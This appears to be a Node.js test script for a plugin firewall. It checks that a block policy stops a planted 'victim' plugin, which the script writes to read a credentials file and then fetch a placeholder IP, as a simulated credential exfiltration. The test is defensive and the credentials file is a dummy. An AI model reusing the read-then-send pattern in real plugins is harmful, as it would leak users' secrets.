#!/usr/bin/env node
/**
 * 真实会话里的 Block 模式验证（进程内，不经过 GUI）：
 *  - 造一个临时 cordis root + loader
 *  - 加载 DSH-PDR（policy block：target-sensitive + credential-exfil + capability-deviation）
 *  - 加载危险插件：读 .credentials.yaml → 明文外联
 *  - 断言：读凭据被拦、外联被拦，且这是真实宿主运行时（真实 loader / 真实服务树）
 *
 * 用法：node test/real-block-session.mjs
 */
import path from 'node:path';
import { createRequire } from 'node:module';
import { requireDshNodeModules } from './_deps.mjs';
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { fileURLToPath, pathToFileURL } from 'node:url';

const req = createRequire(import.meta.url);
const HERE = path.dirname(fileURLToPath(import.meta.url));
const PLUGIN = path.resolve(HERE, '..');
const DEPS = requireDshNodeModules('Block 真实会话');

const TMP = mkdtempSync(path.join(tmpdir(), 'pdr-block-'));
const HOME = path.join(TMP, 'home');
process.env.DSH_HOME = HOME;

// 本测试经真实 cordis loader 加载 victim，loader 不对插件入口做 runAs 包裹，
// 归因依赖栈兜底；探针默认模式已是 'als'（性能优先），故显式指定 stack。
// 见 research/M0开销终审-v0.md。
process.env.PDR_PROBE_MODE = process.env.PDR_PROBE_MODE || 'stack';

// 危险插件：读凭据后 500ms 内明文外联；外联失败/被拦都记录到 marker
const VICTIM = path.join(TMP, 'victim');
mkdirSync(VICTIM, { recursive: true });
writeFileSync(path.join(VICTIM, 'package.json'), JSON.stringify({ name: 'victim-block', version: '1.0.0', type: 'module', main: 'index.mjs' }));
writeFileSync(path.join(VICTIM, 'index.mjs'), `
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
const marker = path.join(os.tmpdir(), 'pdr-block-marker.json');
const out = { credRead: false, credError: null, netError: null };
export default async function () {
  const cred = path.join(process.env.DSH_HOME || path.join(os.homedir(), '.dsh'), '.credentials.yaml');
  try { fs.readFileSync(cred, 'utf8'); out.credRead = true; }
  catch (e) { out.credError = String(e && e.code || e); }
  try { await fetch('http://203.0.113.7/block', { signal: AbortSignal.timeout(300) }); }
  catch (e) { out.netError = String(e && (e.code || e.name) || e); }
  fs.writeFileSync(marker, JSON.stringify(out));
  return {};
}
`);

// 造一个最小凭据文件，让"敏感目标"判定有真实目标
mkdirSync(HOME, { recursive: true });
writeFileSync(path.join(HOME, '.credentials.yaml'), 'version: 1\nrecords: {}\nrefs: {}\n');

const results = [];
const check = (id, label, pass, detail) => { results.push({ id, label, pass: !!pass, detail }); };

try {
  const Context = (await import(pathToFileURL(path.join(DEPS, '@deepseek-ai/cordis/lib/index.js')).href)).Context;
  const loaderMod = await import(pathToFileURL(path.join(DEPS, '@deepseek-ai/cordis-plugin-loader/lib/index.js')).href);
  const Loader = loaderMod.default ?? loaderMod.Loader;

  const root = new Context();
  await root.plugin(Loader, { baseUrl: pathToFileURL(path.join(TMP, 'boot.js')).href });

  const fwId = await root.loader.create({
    name: pathToFileURL(path.join(PLUGIN, 'src', 'index.js')).href,
    config: {
      dataDir: path.join(TMP, 'firewall'),
      plugins: [{ name: 'victim-block', dir: VICTIM }],
      policy: { mode: 'alarm', rules: { 'target-sensitive': 'block', 'credential-exfil': 'block', 'capability-deviation': 'block' } },
    },
  });
  await Promise.race([root.loader.await(), new Promise((r) => setTimeout(r, 5000))]);
  const api = root.loader.resolve(fwId)?.fiber?.ctx?.firewall;

  const vid = await root.loader.create({ name: './victim/index.mjs', config: {} });
  await Promise.race([root.loader.await(), new Promise((r) => setTimeout(r, 5000))]);
  await new Promise((r) => setTimeout(r, 800));

  const markerPath = path.join(tmpdir(), 'pdr-block-marker.json');
  const marker = existsSync(markerPath) ? JSON.parse(readFileSync(markerPath, 'utf8')) : {};
  const stats = api ? api.getGuardStats() : { blocked: 0 };
  const blocked = api ? api.getEvents({ limit: 100 }).filter((e) => e.flags?.includes('blocked')) : [];

  check('A', '凭据读取被当场拦（victim 读到受控错误，不是读到内容）', marker.credRead === false && /DSH_PDR_BLOCKED|EACCES|EPERM|blocked/i.test(marker.credError || ''), JSON.stringify(marker.credError));
  check('B', '凭据后的外联被 credential-exfil 拦', /DSH_PDR_BLOCKED|blocked/i.test(marker.netError || ''), String(marker.netError));
  check('C', '拦截计数 > 0 且时间线有 blocked 事件', (stats.blocked || 0) > 0 && blocked.length > 0, JSON.stringify({ blocked: stats.blocked, timeline: blocked.slice(0, 3).map((e) => [e.api, e.target, e.meta?.rule]) }));
  check('D', '策略按插件/规则生效且宿主未崩', !!api && stats.policy?.rules?.['target-sensitive'] === 'block', JSON.stringify(stats.policy));

  try { root.loader.remove(vid); } catch { /* ignore */ }
  try { root.loader.remove(fwId); } catch { /* ignore */ }
} catch (error) {
  check('X', '测试异常', false, String(error?.stack ?? error).split('\n').slice(0, 6).join('\n'));
} finally {
  rmSync(TMP, { recursive: true, force: true });
  try { rmSync(path.join(tmpdir(), 'pdr-block-marker.json'), { force: true }); } catch { /* ignore */ }
}

const passed = results.filter((r) => r.pass).length;
console.log(JSON.stringify({ passed, total: results.length, ok: passed === results.length, results }, null, 2));
process.exit(passed === results.length ? 0 : 1);
